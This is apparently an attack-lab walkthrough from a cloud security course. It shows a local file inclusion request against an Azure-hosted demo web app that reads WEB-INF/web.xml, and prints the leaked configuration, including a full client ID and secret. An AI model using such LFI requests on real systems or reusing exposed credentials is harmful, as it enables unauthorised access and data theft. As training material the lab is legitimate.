# Attack Lab 4

## Access to the differents resources

Access to the web application, from your browser:
```
https://resourcespharmacorp.azurewebsites.net/
```

Detection of vulnerable Link:
![button](LAB4.png)

Exploit the LFI vulnerability in order to extract the application configuration:
```
https://resourcespharmacorp.azurewebsites.net/main?action=getData&fileName=WEB-INF/web.xml
```
The clientsecret user:credentials for authentication
```
?xml version="1.0" encoding="UTF-8"?>

  AzureAppServicePharmaLFI

     
    home.jsp
  
  
  
    MainServlet
    MainServlet
    servlet.MainServlet
  
  
  
    MainServlet
    /main/*
  
  
  
  
    ClientSecret
    7e7730b1-29ab-4adf-bb20-7ae61987d01f:~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I
  

?
```
